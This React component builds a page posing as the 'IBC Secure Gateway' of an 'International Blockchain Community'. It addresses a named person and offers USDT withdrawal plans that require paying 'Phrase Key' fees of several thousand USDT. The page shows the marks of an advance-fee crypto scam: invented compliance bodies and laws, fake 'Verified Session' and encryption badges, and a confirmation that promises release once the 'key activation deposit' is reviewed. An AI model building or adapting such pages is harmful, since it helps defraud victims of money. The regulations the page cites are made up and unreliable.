import React, { useState } from "react";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardFooter, CardHeader, CardTitle } from "@/components/ui/card";
import { Dialog, DialogContent, DialogDescription, DialogFooter, DialogHeader, DialogTitle } from "@/components/ui/dialog";
import { ShieldCheck, Lock, ArrowRight, CheckCircle2, AlertCircle, Globe, FileText, Activity } from "lucide-react";
import { motion } from "framer-motion";
import ibcLogo from "@assets/generated_images/professional_corporate_logo_for_international_blockchain_community.png";
import { useToast } from "@/hooks/use-toast";

export default function SecurePortal() {
  const [selectedOption, setSelectedOption] = useState<"A" | "B" | null>(null);
  const [isConfirming, setIsConfirming] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [isSuccess, setIsSuccess] = useState(false);
  const { toast } = useToast();

  const handleSelect = (option: "A" | "B") => {
    setSelectedOption(option);
    setIsConfirming(true);
  };

  const handleSubmit = async () => {
    setIsSubmitting(true);
    
    // Simulate network request
    await new Promise(resolve => setTimeout(resolve, 2000));
    
    setIsSubmitting(false);
    setIsConfirming(false);
    setIsSuccess(true);
    
    toast({
      title: "Selection Transmitted",
      description: "Your withdrawal preference has been logged with the ISO-D Compliance Secretariat.",
    });
  };

  if (isSuccess) {
    return (
      <div className="min-h-screen bg-slate-50 flex items-center justify-center p-4">
        <motion.div 
          initial={{ opacity: 0, scale: 0.95 }}
          animate={{ opacity: 1, scale: 1 }}
          className="max-w-md w-full bg-white rounded-lg shadow-xl overflow-hidden border-t-4 border-green-600"
        >
          <div className="p-8 text-center">
            <div className="w-20 h-20 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-6">
              <CheckCircle2 className="w-10 h-10 text-green-600" />
            </div>
            <h2 className="text-2xl font-bold text-slate-900 mb-2">Selection Confirmed</h2>
            <p className="text-slate-600 mb-6">
              Your request for <span className="font-bold text-slate-900">Option {selectedOption}</span> has been securely transmitted to the International Blockchain Community (IBC) admin panel.
            </p>
            
            <div className="bg-slate-50 rounded-md p-4 text-left mb-6 text-sm border border-slate-100">
              <div className="flex justify-between mb-2">
                <span className="text-slate-500">Reference ID:</span>
                <span className="font-mono font-medium">IBC-{Math.floor(Math.random() * 1000000)}</span>
              </div>
              <div className="flex justify-between mb-2">
                <span className="text-slate-500">Status:</span>
                <span className="text-green-600 font-medium flex items-center gap-1">
                  <Activity className="w-3 h-3" /> Awaiting Key Activation
                </span>
              </div>
              <div className="flex justify-between">
                <span className="text-slate-500">Clearance:</span>
                <span className="font-medium">Pending</span>
              </div>
            </div>

            <p className="text-xs text-slate-400 mb-6">
              A confirmation email has been sent to your registered address. Our compliance team will review your key activation deposit shortly.
            </p>

            <Button onClick={() => window.location.reload()} variant="outline" className="w-full">
              Return to Dashboard
            </Button>
          </div>
        </motion.div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-slate-50 text-slate-900 font-sans selection:bg-blue-100">
      {/* Top Navigation Bar */}
      <nav className="bg-white border-b border-slate-200 sticky top-0 z-50 shadow-sm">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex justify-between h-16">
            <div className="flex items-center gap-3">
              <img src={ibcLogo} alt="IBC Logo" className="h-8 w-8 object-contain" />
              <div className="hidden md:block">
                <div className="text-sm font-bold text-primary leading-none">IBC SECURE GATEWAY</div>
                <div className="text-[10px] text-slate-500 font-medium tracking-wider uppercase">Account Integrity Division</div>
              </div>
            </div>
            <div className="flex items-center gap-4">
              <div className="hidden md:flex items-center gap-2 px-3 py-1 bg-green-50 text-green-700 rounded-full text-xs font-medium border border-green-100">
                <ShieldCheck className="w-3 h-3" />
                <span>Verified Session</span>
              </div>
              <div className="flex items-center gap-2 text-xs text-slate-500">
                <span className="w-2 h-2 bg-green-500 rounded-full animate-pulse"></span>
                Connected
              </div>
            </div>
          </div>
        </div>
      </nav>

      <main className="max-w-5xl mx-auto px-4 sm:px-6 lg:px-8 py-12">
        <motion.div 
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.5 }}
        >
          {/* Header Section */}
          <div className="mb-10 text-center md:text-left">
            <div className="inline-flex items-center gap-2 px-3 py-1 rounded-md bg-blue-50 text-blue-700 text-xs font-bold uppercase tracking-wide mb-4 border border-blue-100">
              <Lock className="w-3 h-3" /> Action Required
            </div>
            <h1 className="text-3xl md:text-4xl font-serif font-bold text-slate-900 mb-2">
              Withdrawal Protocol Selection
            </h1>
            <p className="text-sm text-slate-400 mb-6 font-mono">Reference: IBC-AML-CC-774982</p>
          </div>

          {/* Full Letter Content */}
          <div className="bg-white rounded-lg border border-slate-200 p-8 md:p-10 shadow-sm mb-10 relative overflow-hidden">
            {/* Subtle Watermark */}
            <div className="absolute top-[-20%] right-[-10%] w-[50%] h-[150%] opacity-[0.03] pointer-events-none">
              <img src={ibcLogo} alt="" className="w-full h-full object-contain" />
            </div>

            <div className="relative z-10 max-w-3xl">
              <div className="mb-6 pb-6 border-b border-slate-100">
                 <h2 className="text-lg font-bold text-primary font-serif mb-1">INTERNATIONAL BLOCKCHAIN COMMUNITY (IBC)</h2>
                 <p className="text-xs text-slate-500 uppercase tracking-wider font-medium">Account Integrity & Security Operations Division (ISO-D)</p>
              </div>

              <div className="prose prose-slate text-slate-700 max-w-none">
                <p className="font-bold text-lg text-slate-900 font-serif mb-4">Dear Luzmila Chavez,</p>
                
                <p className="mb-4 leading-relaxed">
                  We acknowledge the successful completion of your re-authentication procedure. In accordance with IBC cross-border withdrawal regulations and AML/CTF operational standards, please review the finalised withdrawal options and the required Phrase Key structure necessary to activate your withdrawal schedule.
                </p>
                
                <p className="mb-4 leading-relaxed">
                  This communication is issued by the International Blockchain Community (IBC) under the authority of the Account Integrity & Security Operations Division (ISO-D). All information is confidential and intended solely for the verified account holder.
                </p>
              </div>
            </div>
          </div>

          {/* Options Grid */}
          <h3 className="text-xl font-serif font-bold text-slate-900 mb-6 flex items-center gap-3">
            <div className="w-8 h-[1px] bg-slate-300"></div>
            Select Withdrawal Option
            <div className="w-full h-[1px] bg-slate-300"></div>
          </h3>
          
          <div className="grid md:grid-cols-2 gap-8 mb-12">
            {/* Option A Card */}
            <motion.div whileHover={{ y: -5 }} transition={{ type: "spring", stiffness: 300 }}>
              <Card className={`h-full border-2 cursor-pointer transition-all duration-300 ${selectedOption === 'A' ? 'border-primary ring-4 ring-primary/10 shadow-xl' : 'border-slate-200 hover:border-primary/50 hover:shadow-lg'}`}
                onClick={() => handleSelect('A')}
              >
                <CardHeader className="bg-slate-50 border-b border-slate-100 pb-4">
                  <div className="flex justify-between items-start">
                    <div>
                      <div className="text-xs font-bold text-primary uppercase tracking-wider mb-1">Option A – Accelerated</div>
                      <CardTitle className="text-2xl font-bold text-slate-900">Accelerated Release</CardTitle>
                    </div>
                    <div className="h-10 w-10 rounded-full bg-primary/10 flex items-center justify-center text-primary font-bold">A</div>
                  </div>
                </CardHeader>
                <CardContent className="pt-6 space-y-4">
                  <div className="flex justify-between items-baseline">
                    <span className="text-3xl font-bold text-primary">50,000 <span className="text-sm font-normal text-slate-500">USDT</span></span>
                    <span className="text-sm font-medium text-slate-500">every 12 hours</span>
                  </div>
                  
                  <div className="space-y-3 pt-2">
                    <div className="flex justify-between text-sm py-2 border-b border-slate-100">
                      <span className="text-slate-600">Total Withdrawals</span>
                      <span className="font-semibold text-slate-900">10 Transfers</span>
                    </div>
                    <div className="flex justify-between text-sm py-2 border-b border-slate-100">
                      <span className="text-slate-600">Key Cost</span>
                      <span className="font-semibold text-slate-900">260.996 USDT</span>
                    </div>
                    <div className="flex justify-between text-sm py-2 bg-blue-50 px-3 rounded text-blue-900">
                      <span className="font-semibold">Total Requirement</span>
                      <span className="font-bold">2,609.96 USDT</span>
                    </div>
                  </div>
                  
                  <div className="text-xs text-slate-500 flex gap-2 items-start pt-2">
                    <CheckCircle2 className="w-4 h-4 text-green-600 shrink-0" />
                    Fastest clearance method for high-volume transfers.
                  </div>
                </CardContent>
                <CardFooter className="pt-2 pb-6">
                  <Button className="w-full" variant={selectedOption === 'A' ? 'default' : 'outline'}>
                    Select Option A
                  </Button>
                </CardFooter>
              </Card>
            </motion.div>

            {/* Option B Card */}
            <motion.div whileHover={{ y: -5 }} transition={{ type: "spring", stiffness: 300 }}>
              <Card className={`h-full border-2 cursor-pointer transition-all duration-300 ${selectedOption === 'B' ? 'border-slate-400 ring-4 ring-slate-200 shadow-xl' : 'border-slate-200 hover:border-slate-300 hover:shadow-lg'}`}
                onClick={() => handleSelect('B')}
              >
                <CardHeader className="bg-slate-50 border-b border-slate-100 pb-4">
                  <div className="flex justify-between items-start">
                    <div>
                      <div className="text-xs font-bold text-slate-500 uppercase tracking-wider mb-1">Option B – Standard</div>
                      <CardTitle className="text-2xl font-bold text-slate-900">Standard Release</CardTitle>
                    </div>
                    <div className="h-10 w-10 rounded-full bg-slate-100 flex items-center justify-center text-slate-600 font-bold">B</div>
                  </div>
                </CardHeader>
                <CardContent className="pt-6 space-y-4">
                  <div className="flex justify-between items-baseline">
                    <span className="text-3xl font-bold text-slate-700">25,000 <span className="text-sm font-normal text-slate-500">USDT</span></span>
                    <span className="text-sm font-medium text-slate-500">every 12 hours</span>
                  </div>
                  
                  <div className="space-y-3 pt-2">
                    <div className="flex justify-between text-sm py-2 border-b border-slate-100">
                      <span className="text-slate-600">Total Withdrawals</span>
                      <span className="font-semibold text-slate-900">20 Transfers</span>
                    </div>
                    <div className="flex justify-between text-sm py-2 border-b border-slate-100">
                      <span className="text-slate-600">Key Cost</span>
                      <span className="font-semibold text-slate-900">521.993 USDT</span>
                    </div>
                    <div className="flex justify-between text-sm py-2 bg-slate-100 px-3 rounded text-slate-900">
                      <span className="font-semibold">Total Requirement</span>
                      <span className="font-bold">5,219.92 USDT</span>
                    </div>
                  </div>
                  
                  <div className="text-xs text-slate-500 flex gap-2 items-start pt-2">
                    <CheckCircle2 className="w-4 h-4 text-slate-400 shrink-0" />
                    Suitable for smaller, distributed release amounts.
                  </div>
                </CardContent>
                <CardFooter className="pt-2 pb-6">
                  <Button className="w-full" variant={selectedOption === 'B' ? 'secondary' : 'outline'}>
                    Select Option B
                  </Button>
                </CardFooter>
              </Card>
            </motion.div>
          </div>

          {/* Info Section */}
          <div className="bg-white rounded-lg border border-slate-200 p-6 md:p-8 mb-12 shadow-sm">
             <h3 className="text-lg font-bold text-primary mb-4 flex items-center gap-2">
                <FileText className="w-5 h-5" />
                Mandatory Phrase Key Requirements
             </h3>
             <div className="grid md:grid-cols-2 gap-8">
               <div>
                 <p className="text-sm text-slate-600 mb-3">Phrase Keys are required to:</p>
                 <ul className="space-y-2 text-sm text-slate-600">
                   <li className="flex items-start gap-2">
                     <div className="w-1.5 h-1.5 bg-primary rounded-full mt-1.5"></div>
                     Authenticate each high-value withdrawal
                   </li>
                   <li className="flex items-start gap-2">
                     <div className="w-1.5 h-1.5 bg-primary rounded-full mt-1.5"></div>
                     Ensure uninterrupted cross-border access
                   </li>
                   <li className="flex items-start gap-2">
                     <div className="w-1.5 h-1.5 bg-primary rounded-full mt-1.5"></div>
                     Maintain AML/CTF compliance
                   </li>
                   <li className="flex items-start gap-2">
                     <div className="w-1.5 h-1.5 bg-primary rounded-full mt-1.5"></div>
                     Allow approval through the IBC Global Monitoring Network
                   </li>
                 </ul>
               </div>
               <div className="bg-amber-50 p-4 rounded-md border border-amber-100">
                 <div className="flex gap-3">
                   <AlertCircle className="w-5 h-5 text-amber-600 shrink-0" />
                   <div>
                     <h4 className="text-sm font-bold text-amber-800 mb-1">Compliance Notice</h4>
                     <p className="text-xs text-amber-700 leading-relaxed">
                       Withdrawals initiated without updated Phrase Keys may trigger a 48–96 hour AML review. Your account will be fully cleared once the selected option's requirement is met.
                     </p>
                   </div>
                 </div>
               </div>
             </div>
          </div>

          {/* Footer */}
          <footer className="border-t border-slate-200 pt-8 pb-12 text-center md:text-left">
            <div className="flex flex-col md:flex-row justify-between items-center gap-6">
              <div className="text-xs text-slate-500 space-y-1">
                <p className="font-bold text-slate-700">International Blockchain Community (IBC)</p>
                <p>Account Integrity & Security Operations Division (ISO-D)</p>
                <p>
                  Unauthorised sharing is prohibited under the International Digital Assets Law (IDC-47/2023).
                </p>
              </div>
              <div className="flex gap-6 grayscale opacity-50">
                <div className="flex items-center gap-1 text-[10px] uppercase font-bold tracking-wider">
                  <Globe className="w-3 h-3" /> Global SSL Secured
                </div>
                <div className="flex items-center gap-1 text-[10px] uppercase font-bold tracking-wider">
                  <Lock className="w-3 h-3" /> 256-bit Encryption
                </div>
              </div>
            </div>
          </footer>
        </motion.div>
      </main>

      {/* Confirmation Modal */}
      <Dialog open={isConfirming} onOpenChange={setIsConfirming}>
        <DialogContent className="sm:max-w-md">
          <DialogHeader>
            <DialogTitle className="text-xl font-bold text-primary">Confirm Selection</DialogTitle>
            <DialogDescription>
              You are about to initiate the <span className="font-bold text-slate-900">{selectedOption === 'A' ? 'Accelerated Release (Option A)' : 'Standard Release (Option B)'}</span> protocol.
            </DialogDescription>
          </DialogHeader>
          
          <div className="py-4">
            <div className="bg-slate-50 p-4 rounded-md border border-slate-200 space-y-3 text-sm">
              <div className="flex justify-between">
                <span className="text-slate-500">Total Requirement:</span>
                <span className="font-bold text-slate-900">{selectedOption === 'A' ? '2,609.96 USDT' : '5,219.92 USDT'}</span>
              </div>
              <div className="flex justify-between">
                <span className="text-slate-500">Verification Ref:</span>
                <span className="font-mono text-xs">IBC-AML-CC-774982</span>
              </div>
            </div>
            <p className="text-xs text-slate-500 mt-4">
              By clicking "Submit Selection", you confirm your intent to proceed with this withdrawal schedule. This action will be logged by the Global Monitoring Network.
            </p>
          </div>

          <DialogFooter>
            <Button variant="ghost" onClick={() => setIsConfirming(false)} disabled={isSubmitting}>Cancel</Button>
            <Button onClick={handleSubmit} disabled={isSubmitting} className="w-full sm:w-auto gap-2">
              {isSubmitting ? (
                <>
                  <div className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin"></div>
                  Transmitting...
                </>
              ) : (
                <>
                  Submit Selection <ArrowRight className="w-4 h-4" />
                </>
              )}
            </Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>
    </div>
  );
}
